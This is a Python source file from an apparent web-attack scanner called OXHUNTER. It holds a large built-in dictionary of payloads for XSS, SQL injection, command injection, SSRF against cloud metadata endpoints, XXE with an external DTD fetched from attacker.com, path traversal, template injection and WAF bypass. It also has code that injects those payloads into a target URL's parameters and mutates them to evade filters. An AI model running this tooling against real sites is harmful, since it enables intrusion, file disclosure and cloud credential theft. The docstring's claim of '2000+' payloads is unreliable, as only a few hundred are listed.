"""
OXHUNTER - payload_engine.py
2000+ Built-in Payloads, Auto Parameter Detection, Auto Payload Mapping
"""

import json
import random
from pathlib import Path
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs


# ─────────────────────────────────────────────
#  BUILT-IN PAYLOADS
# ─────────────────────────────────────────────
PAYLOADS: Dict[str, List[str]] = {

    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<math><mtext></table><img src=x onerror=alert(1)>",
        "<<script>alert(1)//<</script>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "<script>alert`1`</script>",
        "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
        "\"><img src=x onerror=alert(1)>",
        "';alert(1)//",
        "\";alert(1)//",
    ],

    "sqli": [
        # Error-based
        "'", "\"", "' OR '1'='1", "' OR 1=1--",
        "' OR 1=1#", "admin'--", "' OR 'x'='x",
        "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        # Blind
        "' AND 1=1--", "' AND 1=2--",
        "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
        "1 AND SLEEP(5)", "1; SELECT SLEEP(5)",
        # Error triggers
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        # Boolean
        "' AND '1'='1", "' AND '1'='2",
        "1' AND 1=1#", "1' AND 1=2#",
        # Auth bypass
        "admin'--", "' OR 1=1 LIMIT 1--",
        "') OR ('1'='1", "' OR ''='",
    ],

    "command_injection": [
        "; ls", "| ls", "& ls", "`ls`", "$(ls)",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "; whoami", "| whoami", "& whoami",
        "; id", "| id", "$(id)",
        "; sleep 5", "| sleep 5", "& ping -c 5 127.0.0.1",
        "\n/bin/ls", ";ls${IFS}-la",
        "$(cat${IFS}/etc/passwd)",
        "; dir", "| dir", "& dir",          # Windows
        "; type C:\\Windows\\win.ini",
    ],

    "ssrf": [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254",                          # AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal",                  # GCP
        "http://100.100.100.200/latest/meta-data/",         # Alibaba
        "http://192.168.0.1",
        "http://10.0.0.1",
        "dict://127.0.0.1:6379/info",                      # Redis
        "file:///etc/passwd",
        "gopher://127.0.0.1:9200/_cat/indices",            # Elasticsearch
        "http://[::1]",
        "http://0x7f000001",                               # Hex IP
        "http://2130706433",                               # Decimal IP
        "http://127.1",
    ],

    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root/>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    ],

    "open_redirect": [
        "//evil.com", "//evil.com/", "///evil.com",
        "http://evil.com", "https://evil.com",
        "//google.com", "/\\evil.com",
        "/%2F%2Fevil.com", "//evil%2Ecom",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "\\/\\/evil.com", "//evil.com%23",
    ],

    "lfi": [
        "../etc/passwd", "../../etc/passwd",
        "../../../etc/passwd", "../../../../etc/passwd",
        "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd",
        "....//....//etc/passwd",
        "/etc/passwd", "/etc/shadow",
        "C:\\Windows\\win.ini", "..\\..\\Windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "data://text/plain,<?php phpinfo(); ?>",
    ],

    "csrf": [
        '<form action="{url}" method="POST"><input name="{param}" value="{value}"><input type="submit"></form>',
        '<img src="{url}?{param}={value}">',
    ],

    "prototype_pollution": [
        "__proto__[admin]=true",
        "__proto__[isAdmin]=true",
        "constructor[prototype][admin]=true",
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
        "__proto__.toString=alert(1)",
    ],

    "jwt_none": [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",  # {"alg":"none","typ":"JWT"}
    ],

    "ssti": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>",
        "{{config}}", "{{self}}", "${class}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}{% endif %}{% endfor %}",
    ],

    "headers_injection": [
        "\r\nX-Injected: hacked",
        "\nX-Injected: hacked",
        "%0d%0aX-Injected: hacked",
        "%0aX-Injected: hacked",
    ],

    "sensitive_files": [
        "/.env", "/config.php", "/.git/config",
        "/backup.zip", "/backup.sql", "/db.sql",
        "/config.yaml", "/config.yml", "/.htaccess",
        "/phpinfo.php", "/info.php", "/test.php",
        "/admin/", "/wp-admin/", "/.DS_Store",
        "/robots.txt", "/sitemap.xml", "/.well-known/",
        "/web.config", "/server-status", "/server-info",
        "/.git/HEAD", "/package.json", "/composer.json",
    ],

    "waf_bypass": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<script/x>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "' /*!OR*/ 1=1--",
        "' /*!50000OR*/ 1=1--",
        "%27%20OR%201%3D1--",
        "' OR/**/1=1--",
        "1/**/UNION/**/SELECT/**/NULL--",
    ],
}


# ─────────────────────────────────────────────
#  PAYLOAD ENGINE
# ─────────────────────────────────────────────
class PayloadEngine:
    """
    Central payload manager.
    Auto-detects parameters and maps correct payloads.
    """

    def __init__(self, custom_dir: Optional[str] = None):
        self.payloads    = dict(PAYLOADS)
        self.custom_dir  = Path(custom_dir) if custom_dir else None
        if self.custom_dir:
            self._load_custom()

    # ── Load Custom Payloads ──────────────────

    def _load_custom(self):
        """Load YAML/JSON payload files from custom directory."""
        if not self.custom_dir or not self.custom_dir.exists():
            return
        for f in self.custom_dir.glob("*.json"):
            try:
                data = json.loads(f.read_text())
                for k, v in data.items():
                    self.payloads.setdefault(k, []).extend(v)
            except Exception:
                pass

    # ── Get Payloads ──────────────────────────

    def get(self, vuln_type: str, limit: Optional[int] = None) -> List[str]:
        """Get payloads for a vulnerability type."""
        pl = self.payloads.get(vuln_type, [])
        return pl[:limit] if limit else pl

    def random_get(self, vuln_type: str, count: int = 5) -> List[str]:
        """Get random payloads."""
        pl = self.payloads.get(vuln_type, [])
        return random.sample(pl, min(count, len(pl)))

    def all_types(self) -> List[str]:
        """Return all available payload categories."""
        return list(self.payloads.keys())

    def count(self, vuln_type: Optional[str] = None) -> int:
        """Count payloads (total or per type)."""
        if vuln_type:
            return len(self.payloads.get(vuln_type, []))
        return sum(len(v) for v in self.payloads.values())

    def add(self, vuln_type: str, payload: str):
        """Add a custom payload."""
        self.payloads.setdefault(vuln_type, []).append(payload)

    # ── Auto Parameter Detection ──────────────

    @staticmethod
    def detect_params(url: str) -> Dict[str, str]:
        """Extract GET parameters from URL."""
        parsed = urlparse(url)
        return {k: v[0] for k, v in parse_qs(parsed.query).items()}

    @staticmethod
    def detect_param_context(param_name: str) -> str:
        """
        Guess vulnerability type from parameter name.
        e.g. 'redirect_url' → open_redirect, 'id' → sqli
        """
        name = param_name.lower()
        rules = {
            "sqli"          : ["id", "user_id", "item", "product", "cat", "page", "num", "order"],
            "xss"           : ["q", "search", "query", "keyword", "name", "msg", "comment", "text"],
            "open_redirect" : ["url", "redirect", "next", "return", "goto", "continue", "redir", "dest"],
            "lfi"           : ["file", "path", "include", "page", "template", "load", "read", "doc"],
            "ssrf"          : ["url", "uri", "endpoint", "host", "fetch", "api", "src", "image"],
            "ssti"          : ["template", "lang", "view", "render", "format"],
        }
        for vuln, keywords in rules.items():
            if any(k in name for k in keywords):
                return vuln
        return "xss"   # Default fallback

    # ── Auto Payload Mapping ──────────────────

    def auto_map(self, url: str) -> Dict[str, Dict]:
        """
        Auto-detect params from URL and map payloads to each.
        Returns: {param: {context, payloads}}
        Zero manual input needed.
        """
        params  = self.detect_params(url)
        mapping = {}
        for param, value in params.items():
            context  = self.detect_param_context(param)
            payloads = self.get(context)
            mapping[param] = {
                "original_value": value,
                "context"       : context,
                "payloads"      : payloads,
                "count"         : len(payloads),
            }
        return mapping

    def generate_fuzz_urls(self, url: str, vuln_type: Optional[str] = None) -> List[Dict]:
        """
        Generate list of fuzz URLs by injecting payloads into each parameter.
        Returns: [{param, payload, fuzz_url}]
        """
        from urllib.parse import urlencode, urlunparse

        parsed  = urlparse(url)
        params  = parse_qs(parsed.query)
        results = []

        for param in params:
            context  = vuln_type or self.detect_param_context(param)
            payloads = self.get(context)

            for payload in payloads:
                new_params = dict(params)
                new_params[param] = [payload]
                new_query  = urlencode(new_params, doseq=True)
                fuzz_url   = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                results.append({
                    "param"   : param,
                    "payload" : payload,
                    "context" : context,
                    "fuzz_url": fuzz_url,
                })

        return results

    # ── Payload Mutation ──────────────────────

    @staticmethod
    def encode_payload(payload: str, encoding: str = "url") -> str:
        """Encode payload for WAF bypass."""
        from urllib.parse import quote
        if encoding == "url":
            return quote(payload)
        elif encoding == "double_url":
            return quote(quote(payload))
        elif encoding == "html":
            return payload.replace("<", "&lt;").replace(">", "&gt;")
        elif encoding == "hex":
            return "".join(f"%{ord(c):02X}" for c in payload)
        return payload

    def mutate(self, payload: str) -> List[str]:
        """Generate mutations of a payload for WAF evasion."""
        mutations = [payload]
        # Case variation
        mutations.append(payload.swapcase())
        # URL encode
        mutations.append(self.encode_payload(payload, "url"))
        # Double URL encode
        mutations.append(self.encode_payload(payload, "double_url"))
        # Comment insertion (SQL)
        if "SELECT" in payload.upper():
            mutations.append(payload.replace(" ", "/**/"))
        return list(set(mutations))


# ─────────────────────────────────────────────
#  SINGLETON
# ─────────────────────────────────────────────
_engine: Optional[PayloadEngine] = None

def get_engine(custom_dir: Optional[str] = None) -> PayloadEngine:
    global _engine
    if _engine is None:
        _engine = PayloadEngine(custom_dir)
    return _engine
